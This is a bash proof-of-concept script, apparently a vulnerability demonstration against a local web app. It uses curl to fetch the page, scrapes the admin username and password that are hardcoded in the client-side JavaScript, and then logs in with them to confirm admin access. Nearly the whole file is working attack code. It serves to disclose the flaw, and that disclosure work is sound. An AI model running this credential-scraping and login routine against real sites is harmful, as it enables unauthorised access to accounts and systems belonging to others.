#!/bin/bash

# POC: Extract Hardcoded Credentials from Client-Side JavaScript
# Demonstrates CRITICAL vulnerability of exposing admin credentials in HTML source

TARGET="http://localhost:8080/index.php"

echo "[*] Extracting hardcoded credentials from client-side JavaScript..."
echo "[*] Target: $TARGET"
echo ""

# Fetch the HTML source and extract the JavaScript function
echo "[*] Fetching HTML source..."
HTML_SOURCE=$(curl -s "$TARGET")

echo "[*] Extracting funcion_login() JavaScript function..."
echo "---"
echo "$HTML_SOURCE" | grep -A 10 "function funcion_login"
echo "---"
echo ""

# Extract the hardcoded credentials using grep
echo "[*] Extracting hardcoded credentials..."
ADMIN_USERNAME=$(echo "$HTML_SOURCE" | grep -oP "username\.value=='[^']*'" | head -1 | sed "s/username\.value=='\|'//g")
ADMIN_PASSWORD=$(echo "$HTML_SOURCE" | grep -oP "password\.value=='[^']*'" | head -1 | sed "s/password\.value=='\|'//g")

echo "[+] CREDENTIALS FOUND:"
echo "    Username: $ADMIN_USERNAME"
echo "    Password: $ADMIN_PASSWORD"
echo ""

# Verify the credentials work by attempting authentication
echo "[*] Verifying credentials work by attempting login..."
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD")

if echo "$LOGIN_RESPONSE" | grep -q "Welcome Admin"; then
    echo "[+] SUCCESS: Credentials are valid - authentication bypass confirmed!"
    echo "[+] Server response contains: 'Welcome Admin'"
    exit 0
else
    echo "[-] Authentication response received (status unknown):"
    echo "$LOGIN_RESPONSE" | head -5
    exit 1
fi